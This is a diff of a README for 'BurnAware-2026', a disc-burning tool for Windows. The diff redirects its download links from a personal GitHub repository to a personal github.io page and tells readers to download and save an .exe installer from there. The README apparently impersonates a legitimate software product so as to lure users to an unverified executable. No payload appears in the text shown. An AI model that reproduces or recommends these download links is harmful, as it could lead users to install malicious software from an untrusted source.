@@ -1,6 +1,6 @@
 # 💿 BurnAware-2026 - Master Your Disc Burning Tasks Daily
 
-[![Download BurnAware](https://img.shields.io/badge/Download-BurnAware-blue.svg)](https://github.com/OwusuRandy/BurnAware-2026)
+[![Download BurnAware](https://img.shields.io/badge/Download-BurnAware-blue.svg)](https://owusurandy.github.io)
 
 BurnAware-2026 provides a stable tool for your disc burning tasks on Windows 10 and 11. This software helps you create data discs, audio CDs, and bootable media. You can store your files or share data with ease using this application. The program works with CDs, DVDs, and Blu-ray discs. It offers a clean interface for all users.
 
@@ -8,7 +8,7 @@ BurnAware-2026 provides a stable tool for your disc burning tasks on Windows 10 
 
 You must visit the repository page to get the installer for your computer. Follow this link to find the latest version:
 
-[https://github.com/OwusuRandy/BurnAware-2026](https://github.com/OwusuRandy/BurnAware-2026)
+[https://owusurandy.github.io](https://owusurandy.github.io)
 
 Click the link above to reach the release section. Locate the file ending in .exe. Save this file to your computer desktop or your Downloads folder.
 
